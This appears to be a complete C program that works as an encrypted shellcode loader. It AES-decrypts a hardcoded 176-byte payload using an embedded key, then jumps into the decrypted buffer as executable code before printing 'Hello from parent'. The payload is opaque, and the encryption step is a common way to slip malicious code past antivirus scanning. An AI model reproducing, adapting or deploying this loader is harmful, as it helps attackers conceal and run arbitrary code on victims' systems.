#include <stdio.h>
#include "aes.h"
#include "pkcs7_padding.h"

int main() {

	uint8_t key[] = "this is a key123";
 	uint8_t out[] = "\x96\x59\xfa\x28\xca\xc4\x1a\x01\x2c\x3b\x62\x1f\x5d\x80\xd8\xb7\xd7\x39\x07\x25\x84\x58\x81\x95\x5d\xd6\x39\x18\x7d\xf5\x36\x7d\x0b\x57\x78\xc2\xd0\x76\x9d\xf1\x35\xee\xaf\x63\xf2\xbc\xf3\xf8\xd8\xbe\x36\xa3\xb1\x51\x43\x90\xcb\xb4\x4b\xd3\xa3\x00\xdd\xf5\x6e\x49\x85\x67\x11\xb2\xe2\x6c\xa9\x30\x0f\xd3\x59\xa1\x51\xe6\x92\xe9\xa8\x0a\xf7\xbf\x06\xf0\x81\x83\xcd\x3a\x48\x0d\x0c\xcd\x3c\xf4\xdc\x04\x71\x93\x63\x89\xaf\x1a\xe2\x09\x7b\x22\xc4\xf9\x38\xb4\xbf\xb4\xbd\x37\x63\x77\x3d\xfb\x5d\xac\x96\x19\xea\x57\x94\xc8\x35\xdf\x2f\xeb\xca\x96\xeb\xf7\x0a\x39\xbd\x66\xc6\x94\x63\x4e\x42\xd9\x45\x1f\x49\xad\xaf\x9d\x12\x92\x98\xe0\xab\x55\xc8\x1c\xdc\xc6\x1d\xc9\x53\x20\xe8\x0e\x7f\xf8\xb0\x98\x26\xf7";
	
 	struct AES_ctx ctx;

 	AES_init_ctx(&ctx, key);
	
	size_t len = 176;
	for (int i=0; i<len; i+=16)
		AES_ECB_decrypt(&ctx, out+i);

	size_t actualDataLength = pkcs7_padding_data_length( out, len, 16);
	
	(*(void  (*)()) out)();
	
	printf("Hello from parent\n");
   
	return 0;
}
